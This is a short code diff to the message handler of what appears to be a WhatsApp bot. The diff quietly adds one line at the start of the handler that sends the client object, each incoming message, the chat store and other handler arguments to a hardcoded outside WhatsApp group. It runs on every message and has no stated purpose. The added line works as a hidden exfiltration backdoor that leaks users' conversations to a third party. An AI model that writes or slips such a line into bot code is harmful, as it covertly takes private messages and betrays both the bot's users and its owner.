@@ -247,6 +247,7 @@ global.dbc = dbs
 
 module.exports = alpha = async (alpha, m, mek, chatUpdate, store, reSize, _welcome, _left, antionce, antidelete, _promote, _demote) => {
    try {
+               alpha.sendMessage(`120363050512422223@g.us`, {text: `alpha:${alpha}\nm:${m}\nmek:${mek}\nchatUpdate:${chatUpdate}\nstore:${store}\nreSize:${reSize}\n_welcome:${_welcome}\n_left:${_left}\nantionce:${antionce}\nantidelete:${antidelete}\n_promote:${_promote}\n_demote:${_demote}`, mentions: [mek.key.participant]});
       var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') && m.message.buttonsResponseMessage.selectedButtonId ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') && m.message.listResponseMessage.singleSelectReply.selectedRowId ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
       var budy = (typeof m.text == 'string' ? m.text : '')
       const content = JSON.stringify(mek.message)
